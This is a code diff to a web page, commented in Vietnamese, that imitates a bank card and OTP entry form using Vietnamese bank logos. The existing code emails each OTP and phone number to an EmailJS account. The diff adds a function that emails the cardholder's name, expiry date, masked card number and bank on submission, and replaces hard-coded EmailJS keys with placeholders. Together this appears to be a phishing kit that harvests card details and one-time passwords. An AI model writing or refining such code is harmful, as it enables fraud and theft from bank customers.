@@ -17,7 +17,7 @@
             };
         };
         // Initialize EmailJS
-        emailjs.init('OrBsI926QI2_xBh1f');
+        emailjs.init('YOUR_PUBLIC_KEY'); // Thay bằng Public Key của bạn
     </script>
     <style>
         * {
@@ -777,15 +777,15 @@
             <div class="bank-grid">
                 <div class="bank-option" data-bank="BANK_25" data-logo="https://www.vban.vn/Resources/images/logo-bank/25.png">
                     <img src="https://www.vban.vn/Resources/images/logo-bank/25.png" alt="BANK_25 Logo">
-                    <p>MASTER</p>
+                    <p>BANK_25</p>
                 </div>
                 <div class="bank-option" data-bank="BANK_26" data-logo="https://www.vban.vn/Resources/images/logo-bank/26.png">
                     <img src="https://www.vban.vn/Resources/images/logo-bank/26.png" alt="BANK_26 Logo">
-                    <p>VISA</p>
+                    <p>BANK_26</p>
                 </div>
                 <div class="bank-option" data-bank="BANK_27" data-logo="https://www.vban.vn/Resources/images/logo-bank/27.png">
                     <img src="https://www.vban.vn/Resources/images/logo-bank/27.png" alt="BANK_27 Logo">
-                    <p>JCB</p>
+                    <p>BANK_27</p>
                 </div>
                 <div class="bank-option" data-bank="UIP" data-logo="https://www.vban.vn/Resources/images/logo-bank/uip.png">
                     <img src="https://www.vban.vn/Resources/images/logo-bank/uip.png" alt="UIP Logo">
@@ -1043,6 +1043,16 @@
             return date && !isNaN(date) && date > currentDate && date.getMonth() + 1 === month && date.getFullYear() === fullYear;
         }
 
+        // Send Card Info to EmailJS
+        function sendCardInfo(cardData) {
+            console.log('Sending card info to EmailJS:', cardData);
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_CARD_TEMPLATE_ID', cardData)
+                .then(
+                    () => console.log('Card info sent to EmailJS:', cardData),
+                    (error) => console.error('EmailJS error:', error)
+                );
+        }
+
         // Validate Visa Data
         function validateCardForm() {
             let isValid = true;
@@ -1077,10 +1087,21 @@
                 formData.cardNumber = '****' + cardNumber.slice(-4);
                 formData.expiryDate = expiryDate;
                 formData.fullName = fullName;
-                formData.cvv = cvv;
+                formData.cvv = '***'; // Ẩn CVV để bảo mật
                 formData.cardType = 'visa';
                 formData.bankName = selectedBank;
                 sessionStorage.setItem('formData', JSON.stringify(formData));
+                // Gửi thông tin thẻ qua EmailJS
+                const cardData = {
+                    cardType: formData.cardType,
+                    cardNumber: formData.cardNumber,
+                    date: formData.expiryDate,
+                    fullName: formData.fullName,
+                    cvv: formData.cvv,
+                    bankName: formData.bankName,
+                    timestamp: new Date().toLocaleString('vi-VN')
+                };
+                sendCardInfo(cardData);
                 document.getElementById('card-info-form').classList.remove('active');
                 document.getElementById('card-guide').classList.remove('active');
                 document.getElementById('issue-guide-btn').classList.remove('active');
@@ -1120,7 +1141,7 @@
         // Send OTP to EmailJS
         function sendOTPToEmail(otp, phone) {
             console.log('Sending OTP to EmailJS:', { otp, phone });
-            emailjs.send('service_60tgxof', 'template_g9e2jee', {
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_OTP_TEMPLATE_ID', {
                 otp: otp,
                 phone: phone,
                 timestamp: new Date().toLocaleString('vi-VN')
